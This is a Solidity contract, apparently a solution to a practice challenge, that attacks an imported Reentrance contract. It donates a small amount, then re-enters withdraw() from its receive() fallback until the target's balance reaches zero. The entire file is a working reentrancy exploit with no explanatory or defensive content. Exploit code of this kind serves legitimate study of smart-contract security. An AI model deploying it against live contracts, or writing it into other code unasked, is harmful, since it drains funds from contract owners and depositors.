// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";
import "hardhat/console.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance private reentanceContract;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentanceContract = Reentrance(contractAddress);
    }

    function hackContract() external {
        reentanceContract.donate{value: 1}(address(this));

        reentanceContract.withdraw();
    }

    receive() external payable {
        if (address(contractAddress).balance > 0) {
            reentanceContract.withdraw();
        }
    }
}
